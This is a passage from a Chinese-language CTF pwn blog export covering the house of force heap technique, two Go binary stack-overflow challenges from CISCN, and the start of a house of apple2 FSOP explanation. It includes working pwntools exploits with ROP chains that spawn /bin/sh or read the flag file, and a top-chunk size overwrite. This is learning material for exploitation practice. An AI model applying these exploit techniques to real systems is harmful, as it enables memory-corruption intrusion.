+<p>其中nb定义在<code>checked_request2size (bytes, nb);</code>,这个宏内部定义了nb的值（也就是sz）。<code>_int_malloc (mstate av, size_t bytes)</code>，bytes是该函数的参数，也就是我们调用malloc函数时传进去的数字。<code>nb</code> 实质上是用来存储经过调整后的内存请求大小的变量。</p>
+<pre><code class="c++">#define REQUEST_OUT_OF_RANGE(req)                                 \
+  ((unsigned long) (req) &gt;=						      \
+   (unsigned long) (INTERNAL_SIZE_T) (-2 * MINSIZE))
+
+/* pad request bytes into a usable size -- internal version */
+
+#define request2size(req)                                         \
+  (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)  ?             \
+   MINSIZE :                                                      \
+   ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)
+
+/* Same, except also perform an argument and result check.  First, we check
+   that the padding done by request2size didn&#39;t result in an integer
+   overflow.  Then we check (using REQUEST_OUT_OF_RANGE) that the resulting
+   size isn&#39;t so large that a later alignment would lead to another integer
+   overflow.  */
+#define checked_request2size(req, sz) \
+(&#123;				    \
+  (sz) = request2size (req);	    \
+  if (((sz) &lt; (req))		    \			//调整后的sz一定要比传入的bytes要大
+      || REQUEST_OUT_OF_RANGE (sz)) \		//一般都会满足，申请的大小不要太大就行
+    &#123;				    \
+      __set_errno (ENOMEM);	    \
+      return 0;			    \
+    &#125;				    \
+&#125;)
+</code></pre>
+<p>这里我们如果申请一个大小为负数的chunk，实际上nb经request2size处理后是一个非常大的正数，但加上一定值后溢出，也就实现了正常的正数与负数的运算。我们的topchunk实际上会向低地址处偏移。需要注意的是，申请一个大小为负数的chunk时，这个负数会被unsigned int转换成一个非常大的数。这时如果我们这个转换后的数的大小大于我们修改的top chunk的size，<code>malloc</code> 将尝试扩展堆空间，这时候就会调用 <code>sysmalloc</code>，其中就会报错退出。所我们一般直接把top chunk的size改成-1，也就是0xffffffffffffffff。基本就可以通过所有检测。</p>
+<img src="/2024/10/03/house-of-force/image-20241003002907725.png" class="">
+
+<p>由于我们要精准控制申请后的大小来使top chunk落在想要的位置，也就是要控制request2size(req)的值</p>
+<pre><code class="c++">#define MALLOC_ALIGNMENT_MASK (MALLOC_ALIGNMENT - 1)	//32位系统上通常为0x7,64位上为0xf
+#define SIZE_SZ (sizeof(size_t))		//32位系统上通常为4,64位上为8
+#define MINSIZE  \
+  (unsigned long)(((MIN_CHUNK_SIZE+MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK))
+#define MIN_CHUNK_SIZE        (offsetof(struct malloc_chunk, fd_nextsize))	//0x20
+
+(((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)  ?             \
+   MINSIZE :                                                      \
+   ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)
+</code></pre>
+<p>由于<code>(req) + SIZE_SZ + MALLOC_ALIGN_MASK</code>一般都会大于MINSIZE，所以我们就要使我们输入req为<code>target_offset - SIZE_SZ - MALLOC_ALIGN_MASK</code>，这样我们只要target_add是关于16字节对齐的，那么最后申请出chunk就会使top_chunk偏移到我们想要的地址处。</p>
+<h4 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h4><h5 id="hitcontraning-lab11"><a href="#hitcontraning-lab11" class="headerlink" title="hitcontraning_lab11"></a>hitcontraning_lab11</h5><img src="/2024/10/03/house-of-force/image-20241003002919869.png" class="">
+
+<img src="/2024/10/03/house-of-force/image-20241003002937355.png" class="">
+
+
+
+<p>我们可以发现有对v4中函数指针的调用，而v4是一个指向堆的指针，那么我们就可以想办法改掉其中的函数指针实现任意地址的跳转，而程序中又有magic后门函数，所以思路就是改位于v4+8位置处的函数指针为magic，最后再传入5来调用magic。</p>
+<img src="/2024/10/03/house-of-force/image-20241003002948587.png" class="">
+
+<img src="/2024/10/03/house-of-force/image-20241003002955916.png" class="">
+
+
+
+<img src="/2024/10/03/house-of-force/image-20241003003131870.png" class="">
+
+
+
+<img src="/2024/10/03/house-of-force/image-20241003003143107.png" class="">
+
+<p>可以发现change_item方法中我们可以任意控制输入大小，从而造成堆溢出，这里其实也可以用overlapping来构造double free，不过显然house_of_force更快更方便。</p>
+<p>先把板子套上：</p>
+<pre><code class="python">def add(size,content):
+    p.sendlineafter(&quot;Your choice:&quot;,&#39;2&#39;)
+    p.sendlineafter(&quot;Please enter the length of item name:&quot;,str(size).encode())
+    p.sendlineafter(&quot;Please enter the name of item:&quot;,content)
+
+def show():
+    p.sendlineafter(&quot;Your choice:&quot;,&#39;1&#39;)
+
+def edit(idx,size,content):
+    p.sendlineafter(&quot;Your choice:&quot;,&#39;3&#39;)
+    p.sendlineafter(&quot;Please enter the index of item:&quot;,str(idx).encode())
+    p.sendlineafter(&quot;Please enter the length of item name:&quot;,str(size).encode())
+    p.sendlineafter(&quot;Please enter the new name of the item:&quot;,content)
+
+def delete(idx):
+    p.sendlineafter(&quot;Your choice:&quot;,&#39;4&#39;)
+    p.sendlineafter(&quot;Please enter the index of item:&quot;,str(idx).encode())
+
+def end():
+    p.sendlineafter(&quot;Your choice:&quot;,&#39;5&#39;)
+</code></pre>
+<p>具体打法：</p>
+<p>首先溢出改top chunk的size域</p>
+<pre><code class="python">magic = 0x0000000000400D49
+
+add(0x30,b&quot;AAAA&quot;)   #0
+edit(0,0x40,b&quot;A&quot;*0x38+p64(0xfffffffffffffff1))
+</code></pre>
+<img src="/2024/10/03/house-of-force/image-20241003003151793.png" class="">
+
+<p>然后算出偏移后申请一个目标大小的chunk</p>
+<pre><code class="python">off = -0x60 - 0x8 - 0xf
+add(off,b&quot;AAAA&quot;)    #1
+</code></pre>
+<img src="/2024/10/03/house-of-force/image-20241003003155240.png" class="">
+
+<p>此时我们发现top chunk已经到了目标位置处，再申请一个chunk就可以改写目标位置函数指针了。</p>
+<pre><code class="python">add(0x10,p64(magic)*2)
+end()
+
+p.interactive()
+</code></pre>
+]]></content>
+      <categories>
+        <category>pwn</category>
+      </categories>
+      <tags>
+        <tag>pwn</tag>
+        <tag>heap</tag>
+        <tag>house of</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>gopwn初探</title>
+    <url>/2024/09/22/go-pwn/</url>
+    <content><![CDATA[<h4 id="go-pwn的特点"><a href="#go-pwn的特点" class="headerlink" title="go pwn的特点"></a>go pwn的特点</h4><ul>
+<li><strong>Golang</strong> 使用了自己的运行时和内存管理机制。Go 的堆栈是可扩展的（split-stack model），即每个 Goroutine 的堆栈大小可以动态扩展。这使得堆栈布局更加复杂，和固定大小的堆栈相比更难预测。</li>
+<li>无标准栈帧，也就是不怎么依靠rbp作为栈帧指针（但实际那个位置有时还是维护rbp），通常通过rsp进行局部变量寻址。</li>
+<li>Go 语言依赖垃圾回收器管理内存，而 C&#x2F;C++ 依赖程序员手动管理内存。这意味着在 Go 程序中，利用内存分配漏洞（如 UAF 或 double free）时，必须考虑到垃圾回收器的行为。</li>
+<li>Go 语言的异常处理机制是通过 <code>panic</code> 和 <code>recover</code> 完成的，而不像 C&#x2F;C++ 使用 <code>setjmp/longjmp</code> 或 C++ 的异常捕获机制。这导致堆栈结构和控制流的变化更为复杂，特别是在发生 <code>panic</code> 后。在漏洞利用过程中，如果程序进入了 <code>panic</code> 状态，控制流会被重定向，这可能干扰漏洞利用过程。</li>
+<li>Go 的堆内存管理机制不同于标准的 <code>malloc</code>&#x2F;<code>free</code>。Go 运行时会使用自己的内存分配器，而不是像传统 C&#x2F;C++ 程序中依赖系统的 <code>malloc</code> 和 <code>free</code>。这意味着许多针对 C&#x2F;C++ 堆的利用技术，如 <code>fastbin attack</code>、<code>tcache</code> 等，不适用于 Go 程序。</li>
+</ul>
+<h4 id="栈扩展机制"><a href="#栈扩展机制" class="headerlink" title="栈扩展机制"></a>栈扩展机制</h4><pre><code class="asm">a:
+lea     r12, [rsp+var_218]			
+cmp     r12, [r14+10h]				//上面两句也有可能是cmp rsp, [r14+10h]这种形式
+jbe     loc_4C18C0
+......
+loc_4C18C0:
+mov     [rsp+arg_0], rax
+mov     [rsp+arg_8], rbx
+mov     [rsp+arg_10], rcx
+call    runtime_morestack_noctxt
+mov     rax, [rsp+arg_0]
+mov     rbx, [rsp+arg_8]
+mov     rcx, [rsp+arg_10]
+jmp     a
+</code></pre>
+<p>r14+0x10地址处存的就是当前栈段的上限信息，不够时会调用runtime_morestack_noctxt进行扩展。call一个函数时与c同样会把返回地址存到栈上，在栈扩展中也会维护好这个返回地址的位置。而每次栈扩展出的新栈与原来的栈是不连续的，但一个栈段只要大小没有耗尽，也可以存多个函数的栈帧。</p>
+<img src="/2024/09/22/go-pwn/image-20240922202642330.png" class="">
+
+<img src="/2024/09/22/go-pwn/image-20240922202650340.png" class="">
+
+<p>可以看到这里的栈实际不在x86_64常使用的栈段中。而且确实会把返回地址压入栈。</p>
+<h4 id="传参顺序"><a href="#传参顺序" class="headerlink" title="传参顺序"></a>传参顺序</h4><p>传参用到的寄存器依次是：AX，BX，CX，DI，SI，R8，R9，R10，R11</p>
+<h4 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h4><h5 id="CISCN-2023-初赛-shallwego"><a href="#CISCN-2023-初赛-shallwego" class="headerlink" title="[CISCN 2023 初赛]shallwego"></a>[CISCN 2023 初赛]shallwego</h5><p>先运行一下看看：</p>
+<img src="/2024/09/22/go-pwn/image-20240922202702201.png" class="">
+
+<p>发现提供了一个shell窗口，但好像要先对cert进行一些操作。看IDA反汇编结果，其中在<strong>main_unk_func0b05</strong>有很多可疑的字符串，经整理大概有如下那么多：</p>
+<pre><code class="txt">nAcDsMicN
+
+echo
+exit
+cert
+cd
+cat flag
+ls -al
+whoami
+</code></pre>
+<p>其中很多都是命令，有一个字符串是在cert命令后检测的。我们通过动态调试能够发现，r8实际存的是命令（不包括操作符）的长度，rbx存的是输入的整个命令被空格分隔的段数。那我们就可以先执行个 <code>cert nAcDsMicN abcdefg</code> 动调看看。</p>
+<img src="/2024/09/22/go-pwn/image-20240922202742958.png" class="">
+
+<p>之后会进入 <strong>main_unk_func0b01</strong> 中，这里实际对我们输入的第三段（其实这里我们已经可以看作大概是<code>cert 用户名 密码</code>这样一个认证过程）进行加密，与一个写死的字符串进行比较，而且rc4加密的密钥也直接写在程序中了。那么我们就可以先将密文base64解码后，把得到的内容当作密码输入进去，然后看rc4加密后的结果，这个结果就是正确的密码了，因为rc4是对称加密算法。最终得到的密码值为<strong>S33UAga1n@#!</strong></p>
+<img src="/2024/09/22/go-pwn/image-20240922202759540.png" class="">
+
+<img src="/2024/09/22/go-pwn/image-20240922202808837.png" class="">
+
+<p>然后shell提示符就会变成 <code>nightingale#</code> ，之后也可以正常调用其他的设置好的命令，但给的那几个命令都不能直接获取真实flag的值，需要再次寻找漏洞点。经过分析发现别的命令都没什么问题，唯独echo这个命令有两段函数专门处理。并且能打印出我们输入的内容，可以尝试进行栈溢出。</p>
+<img src="/2024/09/22/go-pwn/image-20240922202821181.png" class="">
+
+<p>看到这兴奋起来了，因为这里往栈上写了0x75，也就是u，看来是要开始将输入内容存到栈上了。我们的返回地址在<strong>0xc00011adc8</strong>，而输入从<strong>0xc00011ab98</strong>开始存，其中间隔了0x230个字节。然后这个循环中实际有<code>cmp dl, &#39;+&#39;</code>这个条件判断，如果满足会直接调回去自增rax，也就是循环中的下标自增，直接跳过了后面往栈上写的部分。</p>
+<p>那我们先试试echo 0x230字节的垃圾字符看看。</p>
+<img src="/2024/09/22/go-pwn/image-20240922202832431.png" class="">
+
+<p>发现这里最后rdx大于0x200，就直接略过了将值赋值到栈上的操作。说明单次输入不能超过0x200字节，那如果我们在输入中间加入空格呢？</p>
+<img src="/2024/09/22/go-pwn/image-20240922202844042.png" class="">
+
+<p>这次成功跳过了大小的检测，再往下执行看看效果。</p>
+<img src="/2024/09/22/go-pwn/image-20240922202852228.png" class="">
+
+<p>然后发现直接崩掉了，因为rax是一个下标，所以推断是rbx被更改了以至于赋值失败，那么rbx是在哪里被赋值的呢。实际前面有一句<code>mov rbx, [rsp+298h+var_20]</code>,也就是这个rbx基址是存在<strong>ret_addr-0x20</strong>处的。那我们不能更改这个位置的值，但我们又无法获知这个位置的值，该怎么办呢？很巧的是，程序刚好碰到+会跳过赋值，所以我们可以用8个+来保存rbx。其实也不必那么麻烦，直接全用+填充，最后再覆盖也行。然后就能成功覆盖返回地址，但这里这个填充字符数有点迷，最后我本地动调后填充了0x229个字节后才覆盖到返回地址。</p>
+<p>之后是正常的ROP，因为有syscall，就先把&#x2F;bin&#x2F;sh读取到一个地方，然后再用execve调用打即可。最后复现时本地能够用execve通，但远程却有问题，只能拿orw打，不知道是为什么。</p>
+<h6 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h6><pre><code class="python">from pwn import *
+import base64
+context(arch=&quot;amd64&quot;,log_level=&quot;debug&quot;)
+
+# 你的 Base64 编码字符串
+encoded_str = &quot;JLIX8pbSvYZu/WaG&quot;
+# 进行 Base64 解码
+decoded_bytes = base64.b64decode(encoded_str)
+# 打印解码后的字节字符串
+print(decoded_bytes)
+
+p = process(&#39;./service&#39;)
+#p = remote(&quot;node4.anna.nssctf.cn&quot;,28629)
+passwd = b&quot;S33UAga1n@#!&quot;
+payload = b&quot;cert nAcDsMicN &quot; + passwd
+p.sendlineafter(&quot;shell$&quot;,payload)
+pop_rdi_ret = 0x0000000000444fec
+pop_rsi_ret = 0x000000000041e818
+pop_rdx_ret = 0x000000000049e11d
+pop_rax_ret = 0x000000000040d9e6
+syscall = 0x000000000040328c
+ret = 0x000000000040103d
+main = 0x00000000004C1D60
+data = 0x5A34A0
+payload = (b&quot;echo &quot;.ljust(0x1f0,b&quot;A&quot;) + b&quot; &quot;).ljust(0x229,b&quot;+&quot;) + p64(pop_rax_ret) + p64(0) + p64(pop_rdi_ret) + p64(0) + p64(pop_rsi_ret) + p64(data) + p64(pop_rdx_ret) + p64(0x8) + p64(syscall)
+payload += p64(pop_rax_ret) + p64(2) + p64(pop_rdi_ret) + p64(data) + p64(pop_rsi_ret) + p64(0) + p64(pop_rdx_ret) + p64(0) + p64(syscall) 
+payload += p64(pop_rax_ret) + p64(0) + p64(pop_rdi_ret) + p64(3) + p64(pop_rsi_ret) + p64(data) + p64(pop_rdx_ret) + p64(0x40) + p64(syscall)
+payload += p64(pop_rax_ret) + p64(1) + p64(pop_rdi_ret) + p64(1) + p64(pop_rsi_ret) + p64(data) + p64(pop_rdx_ret) + p64(0x40) + p64(syscall)
+#+ p64(pop_rax_ret) + p64(0x3b) + p64(pop_rdi_ret) + p64(data) + p64(pop_rsi_ret) + p64(0) + p64(pop_rdx_ret) + p64(0) + p64(syscall) + p64(main)
+
+p.sendlineafter(&quot;nightingale#&quot;,payload)
+pause()
+p.send(&quot;/flag\x00&quot;)
+p.interactive()
+</code></pre>
+<h5 id="CISCN-2024-初赛-gostack"><a href="#CISCN-2024-初赛-gostack" class="headerlink" title="[CISCN 2024 初赛]gostack"></a>[CISCN 2024 初赛]gostack</h5><img src="/2024/09/22/go-pwn/image-20240922202922399.png" class="">
+
+<p>先运行一遍找提示字符串，看到调用位置在main_func3，直接gdb打断点进去调试一下。发现输入存在如下位置，但是存在栈上的是指针，没什么用。</p>
+<img src="/2024/09/22/go-pwn/image-20240922202932191.png" class="">
+
+<p>之后还会把数据写到栈的另一个地方，这里直接把内容复制到栈上了，并且没有检测加跳转，可能会有溢出。</p>
+<img src="/2024/09/22/go-pwn/image-20240922202943137.png" class="">
+
+<img src="/2024/09/22/go-pwn/image-20240922202953894.png" class="">
+
+<img src="/2024/09/22/go-pwn/image-20240922203005886.png" class="">
+
+<p>然后我们再看看程序的其他部分，其中有个<strong>main_executeCommand</strong>函数引入注目，其中有如下两个子函数：</p>
+<pre><code class="asm">call    os_exec_Command
+...
+call    os_exec__ptr_Cmd_Run
+</code></pre>
+<p>其中前者用于创建一个 <code>Cmd</code> 对象，后者用于执行真正的命令。</p>
+<p>那么我们试试直接填充0x1d0字节，然后把返回地址覆盖为<strong>main_executeCommand</strong>地址。结果会在最后<code>fmt_Fprintf-&gt;fmt__ptr_pp_doPrintf-&gt;fmt__ptr_pp_printArg-&gt;fmt__ptr_pp_fmtString-&gt;fmt__ptr_fmt_fmtS-&gt;fmt__ptr_fmt_padString-&gt;runtime_growslice</code>这个调用链然后gopanic退出，其提示信息为<code>&quot;growslice: cap out of rangeinternal loc&quot;...</code>，也就是说Go 语言在处理切片（slice）扩容时，发生容量超出合理范围时的一个运行时错误。</p>
+<pre><code class="asm">0x449852    mov    rdi, rsi                        RDI =&gt; 0x4141414141414155 (&#39;UAAAAAAA&#39;)
+......
+0x449939    movabs r8, 0x1000000000000         R8 =&gt; 0x1000000000000
+0x449943    cmp    rsi, r8                     0x4141414141414155 - 0x1000000000000     EFLAGS =&gt; 0x206 [ cf PF af zf sf IF df of ]
+0x449946    seta   r9b
+0x44994a    mov    rsi, rcx                    RSI =&gt; 0x14
+0x44994d    mov    r10, rdx                    R10 =&gt; 0x4141414141416000
+0x449950    jmp    0x449c69                    &lt;0x449c69&gt;
+↓
+0x449c69    test   r9b, r9b     1 &amp; 1     EFLAGS =&gt; 0x202 [ cf pf af zf sf IF df of ]
+0x449c6c  ✔ jne    0x449d4d                    &lt;0x449d4d&gt;
+</code></pre>
+<p>我们稍微往前看就可以发现这里rsi和r8的比较实际上应该就是判断切片大小，而存大小的位置被我们覆盖成为了一堆A。也就是说我们破坏了<code>fmt_Fprintf</code>的一些参数。那我们就打断点在这个函数处看看哪些参数被覆盖成了一堆A。rdx很可疑。但前面调用<code>runtime_convTstring</code>后就没有动过rdx了，这个<code>runtime_convTstring</code>函数也比较短，可以跟进去看看。</p>
+<img src="/2024/09/22/go-pwn/image-20240922203024108.png" class="">
+
+<img src="/2024/09/22/go-pwn/image-20240922203039143.png" class="">
+
+<p>其中唯一修改了rdx的是这一句，这个函数的栈帧在一开始 <code>sub rsp, 20h</code> 扩充的空间，这里是把rsp+0x30处的内容复制过来，而rsp+0x30处内容前面有 <code>mov qword ptr [rsp + 0x30], rbx </code> 的修改，而我们进这个函数前rbx就已经是0x4141414141414141了，还要往前追溯。发现前面刚好有个 <code>mov rbx, [rsp+208h+var_C8]</code> ，也就是说我们不能把这个位置的数值覆盖掉。经过进一步用正常数值调试发现，这个位置存的其实就是我们输入的大小。那么我们可以试试先填充0x108个垃圾字符，然后输入大小，之后再正常填充。</p>
+<img src="/2024/09/22/go-pwn/image-20240922203058314.png" class="">
+
+<p>前面的判断绕过了，但在fmt函数中还是崩，但这次是rcx的问题。往前找找，发现是这个<code>runtime_memmove</code>函数的第二个参数源地址被覆盖掉了。</p>
+<img src="/2024/09/22/go-pwn/image-20240922203113527.png" class="">
+
+<p>我们直接把前面要填充的垃圾字符都换成一个可写的地址试试，成功绕过了这个死亡之call，也算是成功地绕过了所有阻碍，终于能劫持控制流返回了（这写了个0x4a0120覆盖返回地址进行测试）。</p>
+<img src="/2024/09/22/go-pwn/image-20240922203128877.png" class="">
+
+<img src="/2024/09/22/go-pwn/image-20240922203145314.png" class="">
+
+<p>后面就可以直接ret2syscall了，这里我本来还想靠<strong>os_exec_Command</strong>玩一下，但还是要先靠read把&#x2F;bin&#x2F;sh读到一个地方，不如直接调用execve。需要注意的是这个syscall会后面带着改栈上的内容，如下图这样rop链就会被打断，需要绕一下。</p>
+<img src="/2024/09/22/go-pwn/image-20240922203202348.png" class="">
+
+<h6 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h6><pre><code class="python">from pwn import *
+context(arch=&quot;amd64&quot;,log_level=&quot;debug&quot;)
+
+p = process(&quot;./gostack&quot;)
+bss_add = 0x00000000005633C0
+syscall = 0x0000000000404043
+pop_rdi_5reg_ret = 0x00000000004a18a5
+pop_rsi_ret = 0x000000000042138a
+pop_rdx_ret = 0x00000000004944ec
+pop_rax_ret = 0x000000000040f984
+rop = p64(pop_rdi_5reg_ret) + p64(0)*6 + p64(pop_rsi_ret) + p64(bss_add) + p64(pop_rdx_ret) + p64(0x8) + p64(pop_rax_ret) + p64(0) + p64(syscall)
+rop += (p64(pop_rdi_5reg_ret) + p64(bss_add)*6)*3 + p64(pop_rsi_ret) + p64(0) + p64(pop_rdx_ret) + p64(0) + p64(pop_rax_ret) + p64(0x3b) + p64(syscall)
+
+payload = (p64(bss_add)*33 + p64(0x1d8))+(p64(bss_add)*24) + rop
+log.success(hex(len(payload)))
+gdb.attach(p)
+pause()
+p.sendlineafter(&quot;Input your magic message :&quot;,payload)
+p.sendline(&quot;/bin/sh\x00&quot;)
+p.interactive()
+</code></pre>
+]]></content>
+      <categories>
+        <category>pwn</category>
+      </categories>
+      <tags>
+        <tag>pwn</tag>
+        <tag>go</tag>
+        <tag>ciscn wp</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>house_of_apple2利用手法浅析</title>
+    <url>/2024/11/10/house-of-apple2%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E6%B5%85%E6%9E%90/</url>
+    <content><![CDATA[<h2 id="house-of-apple2"><a href="#house-of-apple2" class="headerlink" title="house of apple2"></a>house of apple2</h2><h4 id="适用版本"><a href="#适用版本" class="headerlink" title="适用版本"></a>适用版本</h4><ul>
+<li>2.23——至今</li>
+</ul>
+<h4 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h4><ul>
+<li>能控制_IO_FILE的vtable和_wide_data(一般使用largebin attack)</li>
+<li>程序从main函数返回，或者执行exit函数</li>
+<li>能泄露libc_base和heap_base</li>
+</ul>
+<h4 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h4><ol>
+<li>劫持<code>IO_FILE</code>的<code>vtable</code>为<code>_IO_wfile_jumps</code></li>
+<li>控制<code>_wide_data</code>为可控的堆地址空间</li>
+<li>控制<code>_wide_data-&gt;_wide_vtable</code>为可控的堆地址空间</li>
+<li>控制程序执行<code>IO</code>流函数调用，最终调用到<code>_IO_Wxxxxx</code>函数即可控制程序的执行流</li>
+</ol>
+<p>总体来说还是利用FSOP，最后<code>_IO_flush_all_lockp</code>中触发调用<code>_IO_OVERFLOW (fp, EOF)</code>这个虚表函数，因为到了高版本glibc，所以不能直接改虚表，需要借助到其他相似结构的其他虚表。</p>
+<p>大致有三条链：</p>
+<pre><code>_IO_wfile_overflow -&gt; _IO_wdoallocbuf -&gt; _IO_WDOALLOCATE -&gt; *(fp-&gt;_wide_data-&gt;_wide_vtable + 0x68)(fp)
+
+_IO_wfile_underflow_mmap -&gt; _IO_wdoallocbuf -&gt; _IO_WDOALLOCATE -&gt; *(fp-&gt;_wide_data-&gt;_wide_vtable + 0x68)(fp)
+
+_IO_wdefault_xsgetn -&gt; __wunderflow -&gt; _IO_switch_to_wget_mode -&gt; _IO_WOVERFLOW -&gt; *(fp-&gt;_wide_data-&gt;_wide_vtable + 0x18)(fp)
+</code></pre>
+<h4 id="利用细节"><a href="#利用细节" class="headerlink" title="利用细节"></a>利用细节</h4><p>这里以源鲁杯的futureheap这道题对这种利用方式进行学习。</p>
+<h5 id="结构体"><a href="#结构体" class="headerlink" title="结构体"></a>结构体</h5><p>先熟悉一下几个结构体的具体字段。</p>
+<h6 id="IO-FILE"><a href="#IO-FILE" class="headerlink" title="_IO_FILE"></a>_IO_FILE</h6><img src="/2024/11/10/house-of-apple2%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E6%B5%85%E6%9E%90/image-20241109154309187.png" class="">
+
+<h6 id="IO-wfile-jumps"><a href="#IO-wfile-jumps" class="headerlink" title="_IO_wfile_jumps"></a>_IO_wfile_jumps</h6><img src="/2024/11/10/house-of-apple2%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E6%B5%85%E6%9E%90/image-20241109113127595.png" class="">
+
+<h6 id="IO-file-jumps"><a href="#IO-file-jumps" class="headerlink" title="_IO_file_jumps"></a>_IO_file_jumps</h6><img src="/2024/11/10/house-of-apple2%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E6%B5%85%E6%9E%90/image-20241110004510956.png" class="">
+
+<h6 id="IO-wide-data"><a href="#IO-wide-data" class="headerlink" title="_IO_wide_data"></a>_IO_wide_data</h6><img src="/2024/11/10/house-of-apple2%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E6%B5%85%E6%9E%90/image-20241109232015744.png" class="">
+
+<blockquote>
+<p>在glibc2.24以后加入了对虚函数的检测，在调用虚函数之前首先会检查虚函数地址的合法性。</p>
+<p>其检查流程为：计算_IO_vtable 段的长度（section_length），用当前虚表指针的地址减去_IO_vtable  段的开始地址，如果vtable相对于开始地址的偏移大于等于section_length，那么就会进入_IO_vtable_check进行更详细的检查，否则的话会正常调用。如果vtable是非法的，进入_IO_vtable_check函数后会触发abort。</p>
+<p>虽然对vtable的检查较为严格，但是对于具体位置和具体偏移的检测则是较为宽松的，可以修改vtable指针为虚表段内的任意位置，也就是对于某一个**_IO_xxx_jumps**的任意偏移，使得其调用攻击者想要调用的IO函数。</p>
+</blockquote>
+<p>我们的思路就是借鉴FSOP，用_wide_data这个成员结构体中的_wide_vtable，同样是宏调用，但没有进一步的检测。</p>
+<h5 id="1-IO-wfile-overflow链"><a href="#1-IO-wfile-overflow链" class="headerlink" title="1._IO_wfile_overflow链"></a>1._IO_wfile_overflow链</h5><p>源码：</p>
+<pre><code class="c">_IO_wfile_overflow (FILE *f, wint_t wch)
+&#123;
+  if (f-&gt;_flags &amp; _IO_NO_WRITES) /* SET ERROR */
+    &#123;
+      f-&gt;_flags |= _IO_ERR_SEEN;
+      __set_errno (EBADF);
+      return WEOF;
+    &#125;
+  /* If currently reading or no buffer allocated. */
+  if ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == 0)
+    &#123;
+      /* Allocate a buffer if needed. */
+      if (f-&gt;_wide_data-&gt;_IO_write_base == 0)
+    &#123;
+      _IO_wdoallocbuf (f);
+      _IO_free_wbackup_area (f);
+      _IO_wsetg (f, f-&gt;_wide_data-&gt;_IO_buf_base,
+             f-&gt;_wide_data-&gt;_IO_buf_base, f-&gt;_wide_data-&gt;_IO_buf_base);
+
+      if (f-&gt;_IO_write_base == NULL)
+        &#123;
+          _IO_doallocbuf (f);
+          _IO_setg (f, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base);
+        &#125;
+    &#125;
+      else
+    &#123;
+          ......
+    &#125;
+      
+      
+_IO_wdoallocbuf (FILE *fp)
+&#123;
+  if (fp-&gt;_wide_data-&gt;_IO_buf_base)
+    return;
+  if (!(fp-&gt;_flags &amp; _IO_UNBUFFERED))
+    if ((wint_t)_IO_WDOALLOCATE (fp) != WEOF)
+      return;
+  _IO_wsetb (fp, fp-&gt;_wide_data-&gt;_shortbuf,
+             fp-&gt;_wide_data-&gt;_shortbuf + 1, 0);
+&#125;
+      
+#define _IO_WDOALLOCATE(FP) WJUMP0 (__doallocate, FP)
+#define WJUMP0(FUNC, THIS) (_IO_WIDE_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS)
+#define _IO_WIDE_JUMPS_FUNC(THIS) _IO_WIDE_JUMPS(THIS)
+#define _IO_WIDE_JUMPS(THIS) _IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE, _wide_data)-&gt;_wide_vtable
+#define _IO_CAST_FIELD_ACCESS(THIS, TYPE, MEMBER) (*(_IO_MEMBER_TYPE (TYPE, MEMBER) *)(((char *) (THIS)) \
+                       + offsetof(TYPE, MEMBER)))
+</code></pre>
+<p>首先最终的目标是<code>_IO_wdoallocbuf</code>中的<code>(wint_t)_IO_WDOALLOCATE (fp)</code>的调用，追踪几个宏定义会发现，最终执行了<code>*(fp-&gt;_wide_data-&gt;_wide_vtable + 0x68)(fp)</code>这样一个函数。这里的_wide_vtable实际上就是一个虚表，其0x68偏移处就是<code>__doallocate</code>这一项。</p>
+<img src="/2024/11/10/house-of-apple2%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E6%B5%85%E6%9E%90/image-20241109155032548.png" class="">
+
+<p>那么我们反向追溯一下，发现需要让如下的条件成立以绕过条件判断：</p>
+<pre><code class="c">fp-&gt;_wide_data-&gt;_IO_buf_base==0;
+!(fp-&gt;_flags &amp; _IO_UNBUFFERED)!=0;	//(fp-&gt;_flags &amp; 0x2)==0;
+f-&gt;_wide_data-&gt;_IO_write_base == 0;
+f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING == 0;		//f-&gt;_flags &amp; 0x800 == 0;
+f-&gt;_flags &amp; _IO_NO_WRITES==0;		//f-&gt;_flags &amp; 0x8==0;
+</code></pre>
+<p>伪造的_IO_FILE对<code>fp</code>的设置如下：</p>
+<ul>
+<li><code>_flags</code>设置为<code>~(2 | 0x8 | 0x800)</code>，如果不需要控制<code>rdi</code>，设置为<code>0</code>即可；如果需要获得<code>shell</code>，可设置为<code> sh;</code>，注意前面有两个空格</li>
+<li><code>vtable</code>设置为<code>_IO_wfile_jumps/_IO_wfile_jumps_mmap/_IO_wfile_jumps_maybe_mmap</code>地址（加减偏移），使其能成功调用<code>_IO_wfile_overflow</code>即可</li>
+<li><code>_wide_data</code>设置为可控堆地址<code>A</code>，即满足<code>*(fp + 0xa0) = A</code>，因为_IO_FILE的0xa0偏移处是_wide_data域。</li>
+<li><code>_wide_data-&gt;_IO_write_base</code>设置为<code>0</code>，即满足<code>*(A + 0x18) = 0</code></li>
+<li><code>_wide_data-&gt;_IO_buf_base</code>设置为<code>0</code>，即满足<code>*(A + 0x30) = 0</code></li>
+<li><code>_wide_data-&gt;_wide_vtable</code>设置为可控堆地址<code>B</code>，即满足<code>*(A + 0xe0) = B</code></li>
